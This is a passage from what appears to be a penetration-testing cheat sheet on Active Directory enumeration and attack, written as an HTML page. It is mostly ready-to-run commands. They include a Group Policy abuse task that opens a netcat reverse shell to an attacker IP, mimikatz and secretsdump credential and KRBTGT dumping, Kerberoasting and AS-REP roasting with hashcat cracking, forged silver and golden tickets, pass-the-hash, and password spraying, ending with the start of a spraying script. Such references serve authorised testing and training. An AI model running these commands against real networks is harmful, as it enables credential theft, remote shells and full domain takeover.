                    <li><strong>Create a Reverse Shell Task</strong></li>
                  </ul>
                </li>
              </ol>
              <pre><code class="language-powershell">./SharpGPOAbuse.exe --AddComputerTask --TaskName &quot;test&quot; --Author &quot;[current_user]&quot; --Command &quot;cmd.exe&quot; --Arguments &quot;/c c:\path\to\nc.exe [attacker_ip] [port] -e cmd.exe&quot; --GPOName &quot;[GPO_to_abuse]&quot;
</code></pre>
              <ul>
                <li><strong>Add User to Administrators Group</strong></li>
              </ul>
              <pre><code class="language-powershell">.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount &lt;user&gt; --GPOName &quot;[GPO_to_abuse]&quot;
</code></pre>
              <ol start="6">
                <li><strong>Force Policy Update</strong>: apply the GPO changes immediately across the domain.</li>
              </ol>
              <pre><code class="language-powershell">gpupdate /force
</code></pre>
              <h3 id="1215-enumerating-domain-controller">12.15 Enumerating Domain Controller</h3>
              <h4 id="12151-using-enum4linux">12.15.1 Using Enum4linux</h4>
              <ul>
                <li>Enumerate <strong>Basic Information</strong></li>
              </ul>
              <pre><code class="language-bash">enum4linux -U &lt;DOMAIN_IP&gt;
</code></pre>
              <ul>
                <li>Detailed <strong>Share and Users</strong> Enumeration</li>
              </ul>
              <pre><code class="language-bash">enum4linux -a &lt;DOMAIN_IP&gt;
</code></pre>
              <ul>
                <li><strong>Specify Domain Credentials</strong></li>
              </ul>
              <pre><code class="language-bash">enum4linux -u &lt;VALID_USERNAME&gt; -p &lt;VALID_PASSWORD&gt; &lt;DOMAIN_IP&gt;
</code></pre>
              <ul>
                <li><strong>Save Results</strong> to a File</li>
              </ul>
              <pre><code class="language-bash">enum4linux -a &lt;DOMAIN_IP&gt; &gt; domain_enum.txt
</code></pre>
              <h4 id="12152-using-crackmapexec">12.15.2 Using CrackMapExec</h4>
              <ul>
                <li>List <strong>Shares</strong></li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;VALID_USERNAME&gt; -p &lt;VALID_PASSWORD&gt; --shares
</code></pre>
              <ul>
                <li><strong>Dump Group Policy Preferences (GPP)</strong></li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;VALID_USERNAME&gt; -p &lt;VALID_PASSWORD&gt; --gpp-password
</code></pre>
              <ul>
                <li><strong>Dump Passwords</strong> from Domain Controller</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;VALID_USERNAME&gt; -p &lt;VALID_PASSWORD&gt; --sam
</code></pre>
              <ul>
                <li><strong>List Local Admins on Domain Controller</strong></li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;VALID_USERNAME&gt; -p &lt;VALID_PASSWORD&gt; -d [domain].com --lsa
</code></pre>
              <ul>
                <li>Perform <strong>LDAP Enumeration</strong></li>
              </ul>
              <pre><code class="language-bash">crackmapexec ldap &lt;DOMAIN_IP&gt; -u &lt;VALID_USERNAME&gt; -p &lt;VALID_PASSWORD&gt; -d [domain].com --users
</code></pre>
              <h4 id="12153-using-ldapsearch">12.15.3 Using Ldapsearch</h4>
              <ul>
                <li>Basic <strong>LDAP Enumeration</strong></li>
              </ul>
              <pre><code class="language-bash">ldapsearch -x -h &lt;DOMAIN_IP&gt; -s base
</code></pre>
              <ul>
                <li><strong>Enumerate Domain Users (With Credentials)</strong></li>
              </ul>
              <pre><code class="language-bash">ldapsearch -x -h &lt;DOMAIN_IP&gt; -D &quot;&lt;VALID_USERNAME&gt;@[domain].com&quot; -w &lt;VALID_PASSWORD&gt; -b &quot;DC=domain,DC=local&quot; &quot;(objectClass=user)&quot; sAMAccountName
</code></pre>
              <ul>
                <li><strong>Enumerate Computers</strong> in Domain</li>
              </ul>
              <pre><code class="language-bash">ldapsearch -x -h &lt;DOMAIN_IP&gt; -D &quot;&lt;VALID_USERNAME&gt;@[domain].com&quot; -w &lt;VALID_PASSWORD&gt; -b &quot;DC=domain,DC=local&quot; &quot;(objectClass=computer)&quot; name
</code></pre>
              <ul>
                <li><strong>Dump Entire LDAP Structure</strong></li>
              </ul>
              <pre><code class="language-bash">ldapsearch -x -h &lt;DOMAIN_IP&gt; -D &quot;&lt;VALID_USERNAME&gt;@[domain].com&quot; -w &lt;VALID_PASSWORD&gt; -b &quot;DC=domain,DC=local&quot;
</code></pre>
              <h4 id="12154-using-rpcclient">12.15.4 Using Rpcclient</h4>
              <ul>
                <li><strong>Connect to Domain Controller</strong></li>
              </ul>
              <pre><code class="language-bash">rpcclient -U &lt;VALID_USERNAME&gt;%&lt;VALID_PASSWORD&gt; &lt;DOMAIN_IP&gt;
</code></pre>
              <ul>
                <li><strong>Enumerate Domain Users</strong></li>
              </ul>
              <pre><code class="language-bash">rpcclient $&gt; enumdomusers
</code></pre>
              <ul>
                <li><strong>Enumerate Groups</strong></li>
              </ul>
              <pre><code class="language-bash">rpcclient $&gt; enumdomgroups
</code></pre>
              <ul>
                <li><strong>Enumerate Shares</strong></li>
              </ul>
              <pre><code class="language-bash">rpcclient $&gt; netshareenum
</code></pre>
              <ul>
                <li>Query Domain Policy</li>
              </ul>
              <pre><code class="language-bash">rpcclient $&gt; querydominfo
</code></pre>
              <h4 id="12155-using-smbclient">12.15.5 Using Smbclient</h4>
              <ul>
                <li><strong>List Shares</strong> on Domain Controller</li>
              </ul>
              <pre><code class="language-bash">smbclient -L //&lt;DOMAIN_IP&gt; -U &lt;VALID_USERNAME&gt;%&lt;VALID_PASSWORD&gt;
</code></pre>
              <ul>
                <li><strong>Connect to a Specific Share</strong></li>
              </ul>
              <pre><code class="language-bash">smbclient //&lt;DOMAIN_IP&gt;/NETLOGON -U &lt;VALID_USERNAME&gt;%&lt;VALID_PASSWORD&gt;
</code></pre>
              <ul>
                <li><strong>Download Files</strong> from a Share</li>
              </ul>
              <pre><code class="language-bash">smbclient //&lt;DOMAIN_IP&gt;/SYSVOL -U &lt;VALID_USERNAME&gt;%&lt;VALID_PASSWORD&gt; -c &quot;get important_file.txt&quot;
</code></pre>
              <h4 id="12156-using-bloodhound-sharphound">12.15.6 Using BloodHound (SharpHound)</h4>
              <ul>
                <li><strong>Collect Data</strong> from Domain Controller: run the <code>SharpHound</code> executable on
                  a system with valid credentials.</li>
              </ul>
              <pre><code class="language-bash">SharpHound.exe -c All -d [domain].com -u &lt;VALID_USERNAME&gt; -p &lt;VALID_PASSWORD&gt; -dc &lt;DOMAIN_IP&gt;
</code></pre>
              <ul>
                <li>Import Results into BloodHound: analyze the results with the BloodHound GUI.</li>
              </ul>
              <h4 id="12157-using-nmap">12.15.7 Using Nmap</h4>
              <ul>
                <li>Check <strong>Open Ports</strong></li>
              </ul>
              <pre><code class="language-bash">nmap -p 88,135,139,389,445,636,3268,3389 -sC -sV -Pn &lt;DOMAIN_IP&gt;
</code></pre>
              <ul>
                <li>Run <strong>SMB Scripts</strong></li>
              </ul>
              <pre><code class="language-bash">nmap --script smb-enum-shares,smb-enum-users -p445 &lt;DOMAIN_IP&gt;
</code></pre>
              <ul>
                <li>Run <strong>LDAP Scripts</strong></li>
              </ul>
              <pre><code class="language-bash">nmap --script ldap-search -p389 &lt;DOMAIN_IP&gt;
</code></pre>
              <h4 id="12158-using-kerbrute">12.15.8 Using Kerbrute</h4>
              <ul>
                <li><strong>Brute Force Usernames</strong> via Kerberos</li>
              </ul>
              <pre><code class="language-bash"># A good wordlist of usernames is /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt
kerbrute userenum --dc &lt;DOMAIN_IP&gt; -d [domain].com userlist.txt
</code></pre>
              <ul>
                <li><strong>Test Passwords</strong> for Users</li>
              </ul>
              <pre><code class="language-bash">kerbrute passwordspray --dc &lt;DOMAIN_IP&gt; -d [domain].com userlist.txt &lt;PASSWORD&gt;
</code></pre>
              <h4 id="12159-using-powershell-if-allowed">12.15.9 Using PowerShell (if allowed)</h4>
              <ul>
                <li><strong>Dump Domain User Information</strong></li>
              </ul>
              <pre><code class="language-powershell">Get-ADUser -Filter * -Property * | Select-Object Name, SamAccountName, EmailAddress
</code></pre>
              <ul>
                <li><strong>Enumerate Groups</strong></li>
              </ul>
              <pre><code class="language-powershell">Get-ADGroup -Filter * | Select-Object Name, GroupScope
</code></pre>
              <h3 id="1216-enumerating-with-crackmapexec">12.16 Enumerating with CrackMapExec</h3>
              <p><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec GitHub</a></p>
              <h4 id="12161-tips-for-crackmapexec-enumeration">12.16.1 Tips for CrackMapExec Enumeration</h4>
              <ol>
                <li><strong>Detect Active Domain Controllers</strong>: use Nmap or DNS enumeration to locate domain
                  controllers before spraying.</li>
              </ol>
              <pre><code class="language-bash">nmap -p 445 --script smb-os-discovery &lt;IP_RANGE&gt;
</code></pre>
              <ol start="2">
                <li>
                  <p><strong>Enumerate Outside the Domain</strong>: local accounts may be less monitored and prone to
                    reuse of weak credentials; Use the <strong><code>--local-auth</code></strong> option to explicitly
                    test these accounts.</p>
                </li>
                <li>
                  <p><strong>Combine Enumeration Results</strong>: use valid credentials to pivot:</p>
                </li>
              </ol>
              <pre><code class="language-bash">crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --shares --users
</code></pre>
              <ol start="4">
                <li><strong>Pivot to Exploitation</strong>:
                  After discovering accessible shares, leverage tools like <code>smbclient</code> or mount shares:
                </li>
              </ol>
              <pre><code class="language-bash">smbclient //&lt;DOMAIN_IP&gt;/&lt;SHARE&gt; -U &lt;USERNAME&gt;
</code></pre>
              <h4 id="12162-user-enumeration">12.16.2 User Enumeration</h4>
              <pre><code class="language-bash"># Enumerate valid users and their privileges
crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --users

# Check for users with admin privileges
crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --admin

# Enumerate users with valid credentials (password)
crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --users -d &lt;DOMAIN_NAME&gt;

# Enumerate users with valid NTLM hash
crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;USERNAME&gt; -H &lt;NTLM_HASH&gt; --users -d &lt;DOMAIN_NAME&gt;
</code></pre>
              <h4 id="12163-shares-enumeration">12.16.3 Shares Enumeration</h4>
              <pre><code class="language-bash"># Enumerate accessible shares with provided credentials
crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --shares

# List accessible shares using a password
crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --shares -d &lt;DOMAIN_NAME&gt;

# List accessible shares using an NTLM hash
crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;USERNAME&gt; -H &lt;NTLM_HASH&gt; --shares -d &lt;DOMAIN_NAME&gt;
</code></pre>
              <h4 id="12164-group-enumeration">12.16.4 Group Enumeration</h4>
              <pre><code class="language-bash"># List groups in the domain
crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --groups -d &lt;DOMAIN_NAME&gt;

# With NTLM hash
crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;USERNAME&gt; -H &lt;NTLM_HASH&gt; --groups -d &lt;DOMAIN_NAME&gt;
</code></pre>
              <h4 id="12165-password-policy-enumeration">12.16.5 Password Policy Enumeration</h4>
              <pre><code class="language-bash"># Check domain password policies
crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --pass-pol -d &lt;DOMAIN_NAME&gt;
</code></pre>
              <h4 id="12166-local-accounts-enumeration">12.16.6 Local Accounts Enumeration</h4>
              <pre><code class="language-bash"># List users and shares on a local machine
crackmapexec smb &lt;IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --users --shares --local-auth
</code></pre>
              <h4 id="12167-ldap-enumeration">12.16.7 LDAP Enumeration</h4>
              <pre><code class="language-bash"># Dump domain users
crackmapexec ldap &lt;DOMAIN_CONTROLLER_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN_NAME&gt; --users

# Dump domain groups
crackmapexec ldap &lt;DOMAIN_CONTROLLER_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN_NAME&gt; --groups
</code></pre>
              <h4 id="12168-mssql-enumeration">12.16.8 MSSQL Enumeration</h4>
              <pre><code class="language-bash"># List databases
crackmapexec mssql &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --dbs

# Execute SQL queries
crackmapexec mssql &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -q &quot;SELECT name FROM master.dbo.sysdatabases&quot;
</code></pre>

              <h2 id="13-active-directory-attacking">13. <span class="emoji">üëæ</span> Active Directory Attacking</h2>
              <h3 id="131-as-rep-roasting">13.1 AS-REP Roasting</h3>
              <p>AS-REP Roasting targets accounts that do not require pre-authentication, allowing attackers to request
                an AS-REP (Authentication Service Response) message containing the encrypted password hash, which can
                then be brute-forced offline.</p>
              <p><strong>How it works</strong>:</p>
              <ul>
                <li>Attackers request an AS-REP message for accounts that do not enforce Kerberos pre-authentication.
                </li>
                <li>The AS-REP response contains an encrypted portion that uses the user&#39;s password hash as a key.
                </li>
                <li>Attackers can extract this hash and crack it offline using tools like <code>hashcat</code> or
                  <code>John the Ripper</code>.
                </li>
              </ul>
              <p><strong>Steps</strong>:</p>
              <ol>
                <li><strong>Find users without pre-authentication</strong>:</li>
              </ol>
              <pre><code class="language-powershell">Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Property DoesNotRequirePreAuth
</code></pre>
              <ol start="2">
                <li><strong>AS-REP Roasting using Rubeus</strong>:</li>
              </ol>
              <pre><code class="language-powershell">Rubeus.exe asreproast

# The /nowrap option prevents the output from being wrapped to the next line, allowing you to see the entire output on a single line without any breaks
Rubeus.exe asreproast /nowrap
</code></pre>
              <ol start="3">
                <li><strong>AS-REP Hash extraction using Impacket</strong>:</li>
              </ol>
              <pre><code class="language-bash"># From Kali (GetNPUsers.py)
impacket-GetNPUsers -dc-ip [dc-ip] -request -outputfile [output_file].asreproast [domain.com]/[user]

# From Windows
GetNPUsers.py domain/[user]:[password]@[dc-ip] -no-pass
</code></pre>
              <ol start="4">
                <li><strong>Crack the AS-REP hash</strong>:</li>
              </ol>
              <pre><code class="language-bash">hashcat -m 18200 [asrep_hashes_file].txt /usr/share/wordlists/rockyou.txt
</code></pre>
              <h3 id="132-kerberoasting">13.2 Kerberoasting</h3>
              <p>Kerberoasting involves attacking Service Principal Names (SPNs) that are configured in Active
                Directory. Attackers request a <strong>Kerberos Ticket-Granting Service (TGS)</strong> ticket for these
                SPNs, extract the service account hash from the ticket, and brute-force the password offline.</p>
              <p><strong>How it works</strong>:</p>
              <ol>
                <li>The attacker requests a TGS for a service account (SPN) that has a valid ticket.</li>
                <li>The service&#39;s TGS is encrypted with the service account&#39;s password hash.</li>
                <li>The attacker can extract the TGS ticket and crack it offline using tools like <code>hashcat</code>.
                </li>
              </ol>
              <p><strong>Steps</strong>:</p>
              <ol>
                <li><strong>Enumerate Service Principal Names (SPNs)</strong>:</li>
              </ol>
              <pre><code class="language-powershell">GetUserSPNs.py domain/[user]:[password]@[dc-ip]
</code></pre>
              <ol start="2">
                <li><strong>Request a TGS ticket for SPNs</strong>:</li>
              </ol>
              <pre><code class="language-bash"># From Kali
sudo impacket-GetUserSPNs -request -dc-ip [dc-ip] [domain.com]/[user]
or
sudo impacket-GetUserSPNs -request -dc-ip [dc_ip] [domain.com]/[user] -hashes [LMHASH]:[NTHASH] -outputfile [output_file]

# From Windows
GetUserSPNs.py domain/[user]:[password]@[dc-ip] -request
</code></pre>
              <ol start="3">
                <li><strong>Extract TGS ticket from memory using Rubeus</strong>:</li>
              </ol>
              <pre><code class="language-powershell">Rubeus.exe kerberoast
or
Rubeus.exe kerberoast /outfile:[output_file].kerberoast
</code></pre>
              <ol start="4">
                <li><strong>Crack the TGS hash</strong>:</li>
              </ol>
              <pre><code class="language-bash">hashcat -m 13100 [kerberoast_hashes_file].txt /usr/share/wordlists/rockyou.txt
</code></pre>
              <h3 id="133-silver-tickets">13.3 Silver Tickets</h3>
              <p>Silver Tickets allow attackers to forge a Ticket-Granting Service (TGS) for specific services like
                <strong>CIFS</strong> (file sharing) or <strong>HTTP</strong>, enabling access to those services without
                needing a valid TGT from a domain controller.
              </p>
              <p><strong>How it works</strong>:</p>
              <ol>
                <li>The attacker obtains the <strong>NTLM hash</strong> or <strong>Kerberos hash</strong> of a service
                  account.</li>
                <li>The attacker uses this hash to create a forged TGS ticket, allowing them to authenticate to specific
                  services (e.g., CIFS, HTTP).</li>
                <li>Since Silver Tickets bypass domain controllers, they are harder to detect in logs.</li>
              </ol>
              <p><strong>Steps</strong>:</p>
              <ol>
                <li><strong>Extract NTLM hash of the service account</strong> (e.g., CIFS):</li>
              </ol>
              <pre><code class="language-powershell"># 1. Find the [ServiceAccountName]
Get-ADUser -Filter {ServicePrincipalName -ne $null} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
or
Get-ADUser -Filter {ServicePrincipalName -like &quot;*MSSQL*&quot;} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName

# 2. Extract the NTLM hash
mimikatz # lsadump::lsa /inject /name:[ServiceAccountName]

# Example:
mimikatz # lsadump::dcsync /user:HTTP/server01
</code></pre>
              <ol start="2">
                <li><strong>Create a Silver Ticket using Mimikatz</strong>:</li>
              </ol>
              <pre><code class="language-powershell"># 1. Find the Domain SID
(Get-ADDomain).DomainSID
or
whoami /user

# 2. Find the target server (my DC server)
Get-ADDomainController -Filter *
or
netdom query dc

# 3. Create the Silver Ticket, for example in this case /service:CIFS (for help deciding the /service, check Section 12.11)
mimikatz # kerberos::golden /domain:[domain.com] /sid:[domainSID] /target:[targetserver] /rc4:[NTLMHash] /service:[serviceName] /user:[username]

# Example:
mimikatz # kerberos::golden /sid:S-1-5-21-1863423273-656352785-1243762498 /domain:example.com /ptt /target:server01.example.com /service:http /rc4:4d28cf5252d39971462580a51484ca09 /user:testUser
</code></pre>
              <ol start="3">
                <li><strong>Inject the Silver Ticket into the session</strong>:</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # kerberos::ptt silver_ticket.kirbi

# Confirm the existence of the ticket
klist
</code></pre>
              <ol start="4">
                <li><strong>Access the target service</strong> (e.g., CIFS):</li>
              </ol>
              <pre><code class="language-bash">dir \\targetserver\sharedfolder
</code></pre>
              <h3 id="134-golden-tickets">13.4 Golden Tickets</h3>
              <p>Golden Tickets are forged <strong>Ticket-Granting Tickets (TGT)</strong> that allow attackers to
                impersonate any user, including Domain Admins, by creating a TGT valid for the entire domain. Golden
                Tickets are one of the most powerful attacks as they grant persistent, high-level access.</p>
              <p><strong>How it works</strong>:</p>
              <ol>
                <li>The attacker dumps the <strong>KRBTGT</strong> account hash (using tools like
                  <code>Mimikatz</code>).
                </li>
                <li>Using this hash, they can create a forged TGT for any user.</li>
                <li>The forged TGT can be used to authenticate as any user across the domain, including Domain Admins.
                </li>
              </ol>
              <p><strong>Steps</strong>:</p>
              <ol>
                <li><strong>Dump KRBTGT account hash</strong>:</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # lsadump::dcsync /domain:[domain.com] /user:krbtgt
</code></pre>
              <ol start="2">
                <li><strong>Create Golden Ticket using Mimikatz</strong>:</li>
              </ol>
              <pre><code class="language-powershell"># 1. Find the Domain SID
(Get-ADDomain).DomainSID
or
whoami /user

# 2. Find the RID: The RID for the Administrator account is 500, but other accounts will have different RIDs. You can find the RID of a specific user using tools like Mimikatz or by querying Active Directory.
PowerShell -Command "(New-Object System.Security.Principal.NTAccount('domain\ServiceAccount')).Translate([System.Security.Principal.SecurityIdentifier]).Value"

# 3. Create the Ticket
mimikatz # kerberos::golden /user:[DesiredUsername] /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:[DesiredRID]
or
mimikatz # kerberos::golden /user:Administrator /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:500
</code></pre>
              <ol start="3">
                <li><strong>Inject Golden Ticket</strong>:</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # kerberos::ptt golden_ticket.kirbi

# Confirm the existence of the ticket
klist
</code></pre>
              <ol start="4">
                <li><strong>Access domain resources</strong>:</li>
              </ol>
              <pre><code class="language-bash">net use \\domaincontroller\C$ /user:[DesiredUsername]
</code></pre>
              <h3 id="135-domain-controller-synchronization-dc-sync">13.5 Domain Controller Synchronization (DC Sync)
              </h3>
              <p>The DC Sync attack involves mimicking a Domain Controller (DC) to request credentials from another DC,
                effectively obtaining password hashes (including KRBTGT, Admins) without triggering alarms.</p>
              <p><strong>How it works</strong>:</p>
              <ol>
                <li><strong>Permissions</strong>: The attacker needs to have the <strong>Replicating Directory
                    Changes</strong> or <strong>Replicating Directory Changes All</strong> permissions, which are often
                  granted to Domain Admins and other high-privilege accounts.</li>
                <li><strong>Replication Request</strong>: By sending a replication request, the attacker can pull user
                  account data, including password hashes, directly from a Domain Controller.</li>
                <li><strong>Credential Theft</strong>: Once the attacker obtains these hashes, they can use them for
                  further attacks (like Pass-the-Hash or Pass-the-Ticket) or crack them to obtain plaintext passwords.
                </li>
              </ol>
              <p><strong>Steps</strong>:</p>
              <ol>
                <li><strong>Identify Domain Admins</strong>: ensure you have the required permissions.</li>
              </ol>
              <pre><code class="language-powershell">Get-ADGroupMember -Identity &quot;Domain Admins&quot;
</code></pre>
              <ol start="2">
                <li><strong>Perform DC Sync using Mimikatz</strong>:</li>
              </ol>
              <pre><code class="language-powershell"># From Kali
impacket-secretsdump [domain.com]/[adminUser]:&quot;[password]&quot;@[dc-ip]
# or; the -just-dc-user [targetUser] is to only extract the hashes of the indicated user and not all the DC.
impacket-secretsdump -just-dc-user [targetUser] [domain.com]/[adminUser]:&quot;[password]&quot;@[dc-ip]

# From Windows
mimikatz # lsadump::dcsync /domain:[domain.com]
# or; here we just extract the specified user.
mimikatz # lsadump::dcsync /domain:[domain.com] /user:[targetUser]</code></pre>
              <ol start="4">
                <li><strong>Extracting all accounts and hashes</strong>:</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # lsadump::dcsync /domain:[domain.com]
</code></pre>
              <ol start="5">
                <li><strong>Output to a file</strong>:</li>
              </ol>
              <pre><code class="language-powershell"># You can redirect output to a file for analysis:
mimikatz # lsadump::dcsync /domain:domain.com &gt; output.txt
</code></pre>
              <ol start="6">
                <li><strong>Crack dumped hashes</strong>:</li>
              </ol>
              <pre><code class="language-bash">hashcat -m 1000 [hashes_file].txt /usr/share/wordlists/rockyou.txt
</code></pre>
              <h3 id="136-cached-ad-credentials">13.6 Cached AD Credentials</h3>
              <p>Cached credentials allow users to log in to their machines even if the domain controller is
                unavailable. Attackers can extract these cached credentials from compromised systems. <strong>Many more
                  commands to extract cached credentials from Mimikatz can be found in the Section 6.12</strong>.</p>
              <p><strong>How it works</strong>:</p>
              <ol>
                <li>When users log in, the <strong>NTLM hash</strong> of their password is cached locally.</li>
                <li>Attackers can use tools to extract and crack these cached hashes offline.</li>
              </ol>
              <p><strong>Steps</strong>:</p>
              <ol>
                <li><strong>Dump cached credentials using Mimikatz</strong>:</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::logonpasswords

mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::tickets
mimikatz # sekurlsa::credman
mimikatz # sekurlsa::msv
mimikatz # sekurlsa::tspkg
mimikatz # sekurlsa::wdigest
mimikatz # sekurlsa::kerberos
mimikatz # sekurlsa::ssp

mimikatz # lsadump::sam
mimikatz # lsadump::secrets
mimikatz # lsadump::lsa /inject
mimikatz # lsadump::trust
mimikatz # lsadump::cache
</code></pre>
              <ol start="2">
                <li><strong>Crack cached credentials</strong>:</li>
              </ol>
              <pre><code class="language-bash">hashcat -m 1000 [cached_hash].txt /usr/share/wordlists/rockyou.txt
</code></pre>
              <h3 id="137-ntlm-authentication">13.7 NTLM Authentication</h3>
              <p><strong>NTLM</strong> (NT LAN Manager) is a challenge-response authentication protocol used in older
                Windows systems or when Kerberos is unavailable.</p>
              <p><strong>How it works</strong>:</p>
              <ol>
                <li>The client sends a <strong>NTLM negotiation</strong> message.</li>
                <li>The server sends back a <strong>challenge</strong> (random data).</li>
                <li>The client uses the challenge, combined with the user&#39;s <strong>NTLM hash</strong>, to create a
                  <strong>response</strong>.
                </li>
                <li>The server checks the response using the stored NTLM hash of the user.</li>
              </ol>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/ntlm_authentication.png" class="img-fluid" alt="Descripci√≥n de la imagen">
                  <figcaption class="figure-caption text-center">NTLM Authentication Protocol</figcaption>
                </figure>
              </div>
              <p><strong>Vulnerabilities</strong>:</p>
              <ul>
                <li><strong>Pass-the-Hash</strong>: Attackers can reuse NTLM hashes without knowing the plaintext
                  password.</li>
                <li><strong>NTLM Relay</strong>: Attackers can relay NTLM authentication to another server.</li>
              </ul>
              <p><strong>Steps to do Pass-the-Hash for AD services</strong>:</p>
              <ol>
                <li><strong>Dump NTLM hash using Mimikatz</strong>:</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # sekurlsa::logonpasswords
</code></pre>
              <ol start="2">
                <li><strong>Pass the NTLM hash using Mimikatz</strong>:</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # sekurlsa::pth /user:[username] /domain:[domain.com] /ntlm:[NTLMhash]
</code></pre>
              <ol start="3">
                <li><strong>Access remote resources</strong>:</li>
              </ol>
              <pre><code class="language-bash">dir \\targetserver\sharedfolder
</code></pre>
              <h3 id="138-kerberos-authentication">13.8 Kerberos Authentication</h3>
              <p><strong>Kerberos</strong> is the default authentication protocol in modern Windows domains, offering
                mutual authentication via tickets.</p>
              <p><strong>How it works</strong>:</p>
              <ol>
                <li><strong>AS-REQ</strong>: The client requests a Ticket Granting Ticket (TGT) from the Key
                  Distribution Center (KDC) using their credentials.</li>
                <li><strong>AS-REP</strong>: The KDC responds with a TGT, encrypted with the user&#39;s password hash.
                </li>
                <li><strong>TGS-REQ</strong>: The client presents the TGT to the KDC to request access to a service.
                </li>
                <li><strong>TGS-REP</strong>: The KDC issues a <strong>Ticket Granting Service (TGS)</strong> ticket for
                  the requested service.</li>
                <li><strong>Service Authentication</strong>: The client uses the TGS to authenticate with the target
                  service.</li>
              </ol>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/kerberos_authentication.jpg" class="img-fluid" alt="Descripci√≥n de la imagen">
                  <figcaption class="figure-caption text-center">Kerberos Authentication Protocol</figcaption>
                </figure>
              </div>
              <p><strong>Vulnerabilities</strong>:</p>
              <ul>
                <li><strong>Pass-the-Ticket</strong>: Attackers can steal and reuse Kerberos tickets (TGT or TGS).</li>
                <li><strong>Kerberoasting</strong>: Attackers extract and crack service account hashes from TGS tickets.
                </li>
              </ul>
              <p><strong>Steps for Pass-the-Ticket Attack</strong>:</p>
              <ol>
                <li><strong>Dump the TGT ticket using Mimikatz</strong>:</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # sekurlsa::tickets /export
</code></pre>
              <ol start="2">
                <li><strong>Pass the Kerberos TGT ticket</strong>:</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # kerberos::ptt TGT_ticket.kirbi
</code></pre>
              <ol start="3">
                <li><strong>Access resources</strong>:</li>
              </ol>
              <pre><code class="language-bash">dir \\targetserver\sharedfolder
</code></pre>
              <h3 id="139-password-attacks">13.9 Password Attacks</h3>
              <h4 id="1391-spraying-creds-with-script">13.9.1 Spraying Creds with Script</h4>
              <h5 id="13911-running-the-script">13.9.1.1 Running the Script</h5>
              <pre><code class="language-powershell"># -Pass allow us to use a single password to test.
# We could also add the option -File to use a personalized password wordlist.
# -Admin option is for adding test for admin account.
.\Spray-Passwords.ps1 -Pass [password] -Admin
</code></pre>
              <h5 id="13912-source-code-of-the-script">13.9.1.2 Source Code of the Script</h5>
              <pre><code class="language-powershell">&lt;#
  .SYNOPSIS
    PoC PowerShell script to demo how to perform password spraying attacks against
     user accounts in Active Directory (AD), aka low and slow online brute force method.
    Only use for good and after written approval from AD owner.
    Requires access to a Windows host on the internal network, which may perform
     queries against the Primary Domain Controller (PDC).
    Does not require admin access, neither in AD or on Windows host.
    Remote Server Administration Tools (RSAT) are not required.

    Should NOT be considered OPSEC safe since:
    - a lot of traffic is generated between the host and the Domain Controller(s).
    - failed logon events will be massive on Domain Controller(s).
    - badpwdcount will iterate on user account objects in scope.

    No accounts should be locked out by this script alone, but there are no guarantees.
    NB! This script does not take Fine-Grained Password Policies (FGPP) into consideration.
  .DESCRIPTION
    Perform password spraying attack against user accounts in Active Directory.
  .PARAMETER Pass
    Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass &#39;Password1,Password2&#39;. Do not use together with File or Url.&quot;

  .PARAMETER File
    Supply a path to a password input file to test multiple passwords for each targeted user account. Do not use together with Pass or Url.

  .PARAMETER Url
    Download file from given URL and use as password input file to test multiple passwords for each targeted user account. Do not use together with File or Pass.

  .PARAMETER Admins
    Warning: will also target privileged user accounts (admincount=1.)&quot;. Default = $false.
  .EXAMPLE
    PS C:\&gt; .\Spray-Passwords.ps1 -Pass &#39;Summer2016&#39;
